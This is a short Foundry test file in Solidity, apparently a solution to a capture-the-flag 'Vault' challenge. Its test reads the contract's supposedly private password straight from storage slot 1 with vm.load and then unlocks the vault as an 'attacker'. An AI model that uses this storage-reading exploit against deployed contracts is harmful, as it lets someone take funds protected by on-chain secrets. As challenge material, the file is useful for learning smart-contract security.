//SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "src/vault/Vault.sol";

contract VaultTest is Test {

    address deployer;
    address attacker;
    Vault vault;

    function setUp() public {
        deployer = makeAddr("deployer");
        attacker = makeAddr("attacker");

        vm.prank(deployer);
        vault = new Vault(bytes32(uint256(12345)));
    }

    function test_attack() public {
        vm.prank(attacker);
        bytes32 password = vm.load(address(vault), bytes32(uint256(1)));
        vault.unlock(password);
        assertFalse(vault.locked(), "false");

    }
}